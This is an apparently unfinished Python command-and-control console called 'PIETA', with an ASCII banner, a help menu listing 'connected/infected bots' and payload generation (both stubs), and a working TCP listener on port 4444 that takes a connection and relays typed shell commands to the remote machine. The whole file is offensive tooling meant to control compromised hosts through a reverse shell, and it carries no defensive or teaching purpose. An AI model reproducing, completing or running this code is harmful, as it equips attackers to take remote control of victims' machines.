import os, sys, time, subprocess, requests, socket
from prompt_toolkit.shortcuts import prompt
from prompt_toolkit.styles import Style
from prompt_toolkit import *
from prompt_toolkit.history import FileHistory
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from terminaltables import *
'''
WORK IN PROGRESS
WORK IN PROGRESS
WORK IN PROGRESS
WORK IN PROGRESS
WORK IN PROGRESS
'''
class colors:
	HEADER = '\033[95m'
	OKBLUE = '\033[94m'
	OKCYAN = '\033[96m'
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	END = '\033[0m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'
def list():
	table_data = [
	['Command', 'Description', 'Usage'],
	['help', 'Displays this help menu', 'help'],
	['listen', 'Starts a listener', 'listen'],
	['list', 'Lists connected/infected bots', 'list'],
	['generate', 'Generates a payload', 'generate'],
	['exit', 'Exits the application', 'exit'],
	]
	table = SingleTable(table_data)
	print(colors.OKGREEN+colors.BOLD+table.table+colors.END)

def banner():
	print(colors.OKCYAN+"""

            ███            █████             
           ▒▒▒            ▒▒███              
 ████████  ████   ██████  ███████    ██████  
▒▒███▒▒███▒▒███  ███▒▒███▒▒▒███▒    ▒▒▒▒▒███ 
 ▒███ ▒███ ▒███ ▒███████   ▒███      ███████ 
 ▒███ ▒███ ▒███ ▒███▒▒▒    ▒███ ███ ███▒▒███ 
 ▒███████  █████▒▒██████   ▒▒█████ ▒▒████████
 ▒███▒▒▒  ▒▒▒▒▒  ▒▒▒▒▒▒     ▒▒▒▒▒   ▒▒▒▒▒▒▒▒ 
 ▒███                                        
 █████         ..~..                             
▒▒▒▒▒   ..~:+:++++=====++:~            
       ~~::++++++=======o==oo+:         
     ~:::++++++==+=======o==oooo~       
   ~::::+++++=+=+++++=====ooooooo+      
  ~::::++++++=+=====+=======oooooo:     
 ~:::::::+++++=++====++=+====oooooo~    
.:::::::+++++++=+==o==+++=+++=o===o+    
~::::::::+++=++=========:::+=+++=oo+    
:~::::::::++++++=====o=~~:+=o+==+====~  
~:~:~::~::+++=+=++====+~:+======++ooo~  
 ~~~~:::::++++===+++=+:+==o=oooooooo+   
  ::::~::++++=~..~::..~~~:+=====ooo=~   
   ~~~~~~:++=o:...:o:~~::+~:::+=ooo=o=  
     ..~~~~:+==~   +o=====~~+++=ooo=o=. 
            .~~     +====+..~++++++++=+ 
                    ~++===:~~+:::~::++. 
                    ~=+====o=o===o++o:  
                      ::++++==ooooooo~  
                           .~:+==ooooo   
        Author: Manjoos

		""")
def generate():
	pass

def recv_timeout(the_socket, timeout=1):
    """ Socket read method """
    the_socket.setblocking(0)
    total_data = []
    data = ''
    begin = time.time()

    while True:
        # if you got some data, then break after wait sec
        if total_data and time.time() - begin > timeout:
            break
        # if you got no data at all, wait a little longer
        elif time.time() - begin > timeout * 1:
            break
        try:
            data = the_socket.recv(8192)
            if data:
                total_data.append(data.decode('utf-8'))
                begin = time.time()
            else:
                time.sleep(0.1)
        except socket.error as e:
            if not e.errno == 11:
                raise

    return ''.join(total_data)

def server(host, port):
    """ Server Method """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port))
    s.listen(10)
    conn, addr = s.accept()
    print('Connected by', addr)

    return conn

def console(conn):
    """ Run cmd shell """
    while True:
        send_data = input("# ").strip()
        # check for exit
        if send_data == 'exit' or send_data == 'q':
            break
        if send_data:
            conn.sendall('{}\n'.format(send_data).encode('utf-8'))
        else:
            continue
        # get response from client
        print(recv_timeout(conn))

    conn.close()


def execute(conn, send_data):
    """ Execute(send) single command """
    if send_data.strip():
        conn.sendall('{}\n'.format(send_data).encode('utf-8'))
        # get response from client
        print(recv_timeout(conn))

    conn.close()

def listen():
	host = ''
	port = 4444
	print("Listening on 0.0.0.0 port 4444")
	try:
	    client = server(host, port)
	    console(client)
	except KeyboardInterrupt:
	    sys.exit('\nUser cancelled')



def prompt():
	banner()
	while True:
		try:
			cmd = input(colors.WARNING + colors.BOLD +"[+] PIETA [+] ❯ " + colors.END)
			if cmd == "list":
				print("Feature not implemented yet..")
			elif cmd == "?":
				list()
			elif cmd == "help":
				list()
			elif cmd == "exit":
				print("Thanks for your time :)")
				break
			elif cmd == "generate":
				print("Feature not implemented yet..")
			elif cmd == "listen":
				listen()
			else:
				print("Invalid command, type ? or help")
		except KeyboardInterrupt:
			print("\nType exit to exit")

def main():
	prompt()
if __name__ == "__main__":
	main()
